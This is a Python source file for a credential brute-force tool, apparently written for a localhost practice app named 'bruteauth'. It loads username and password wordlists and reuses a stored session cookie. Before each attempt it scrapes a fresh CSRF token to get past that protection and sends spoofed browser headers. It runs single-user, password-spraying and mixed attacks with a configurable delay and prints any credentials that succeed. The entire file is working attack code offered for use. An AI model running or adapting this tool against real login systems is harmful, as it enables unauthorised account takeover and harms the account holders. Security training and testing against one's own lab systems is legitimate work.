import requests
from bs4 import BeautifulSoup
import time

# URLs for login and authentication
LOGIN_URL = 'http://localhost/bruteauth/login.php'
AUTH_URL = 'http://localhost/bruteauth/authenticate.php'

# Load username and password lists
try:
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)

def load_cookie():
    """Load session cookie from file."""
    try:
        with open('browser_cookie.txt', 'r') as file:
            cookie_line = file.read().strip()
            key, value = cookie_line.split('=', 1)
            return {key: value}
    except Exception as e:
        print(f"Error loading cookie: {e}")
        exit(1)

def fetch_csrf_token(session):
    """Fetch CSRF token from the login page."""
    response = session.get(LOGIN_URL)
    if response.status_code != 200:
        print(f"Failed to retrieve login page. Status code: {response.status_code}")
        return None

    # Extract CSRF token from the page
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})

    if csrf_token is None:
        print("CSRF token not found.")
        return None

    return csrf_token['value']

def attempt_login(session, username, password, csrf_token):
    """Attempt to login with given username, password, and CSRF token."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': LOGIN_URL  # Referer header to mimic browser behavior
    }

    login_data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }

    # Perform the login request
    response = session.post(AUTH_URL, data=login_data, headers=headers, allow_redirects=False)

    # Handle redirects
    if response.status_code == 302:
        print(f"Redirected to: {response.headers.get('Location')}")
        return True, response  # Login successful, redirection occurred

    return "Login successful!" in response.text, response  # Adjust based on your app's success message

# Define color codes
GREEN = "\033[32m"
RESET = "\033[0m"  # Reset to default color

def vertical_brute_force(single_username, sleep_time):
    """Perform vertical brute-force attack for a single user."""
    with requests.Session() as session:
        # Load cookie into the session
        session.cookies.update(load_cookie())

        csrf_token = fetch_csrf_token(session)
        if csrf_token is None:
            print("Failed to fetch CSRF token. Aborting.")
            return

        for password in passwords:
            success, response = attempt_login(session, single_username, password, csrf_token)

            if success:
                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
                return  # Exit after a successful login
            elif "Invalid credentials" in response.text:
                print(f"[FAIL] Password: {password}")
            else:
                print(f"[ERROR] Unexpected response for Password: {password}")

            time.sleep(sleep_time)  # Customizable sleep time

def horizontal_attack(sleep_time):
    """Perform horizontal brute-force attack (one password across all users)."""
    with requests.Session() as session:
        # Load cookie into the session
        session.cookies.update(load_cookie())

        for password in passwords:
            print(f"Attempting Password: {password} across all users")

            for username in usernames:
                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
                if csrf_token is None:
                    print("Failed to fetch CSRF token. Skipping.")
                    continue

                success, response = attempt_login(session, username, password, csrf_token)

                if success:
                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
                    break  # Exit the loop as soon as the correct password is found
                elif "Invalid credentials" in response.text:
                    print(f"[FAIL] Username: {username}, Password: {password}")
                else:
                    print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")

                time.sleep(sleep_time)  # Customizable sleep time


def mixed_attack(sleep_time):
    """Perform mixed brute-force attack (all passwords for one user at a time)."""
    with requests.Session() as session:
        # Load cookie into the session
        session.cookies.update(load_cookie())

        for username in usernames:
            print(f"Attempting passwords for Username: {username}")

            for password in passwords:
                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
                if csrf_token is None:
                    print("Failed to fetch CSRF token. Skipping.")
                    continue

                success, response = attempt_login(session, username, password, csrf_token)

                if success:
                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
                    break  # Break the inner loop as soon as the correct password is found
                elif "Invalid credentials" in response.text:
                    print(f"[FAIL] Username: {username}, Password: {password}")
                else:
                    print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")

                time.sleep(sleep_time)  # Customizable sleep time

            print(f"Finished trying passwords for Username: {username}")

# Choose the attack type
try:
    sleep_time = float(input("Enter sleep time between requests (in seconds, e.g., 1.5): "))
except ValueError:
    print("Invalid input. Using default sleep time of 1 second.")
    sleep_time = 1.0

print("Select attack type: \n1. Vertical (multiple passwords, single user)\n2. Horizontal (single password, multiple users)\n3. Mixed (multiple passwords, all users)")
choice = input("Enter choice (1, 2, or 3): ")

if choice == "1":
    target_username = input("Enter the username for vertical brute-force: ")
    vertical_brute_force(target_username, sleep_time)  # Calls vertical attack function
elif choice == "2":
    horizontal_attack(sleep_time)  # Calls horizontal attack function
elif choice == "3":
    mixed_attack(sleep_time)  # Calls mixed attack function
else:
    print("Invalid choice.")
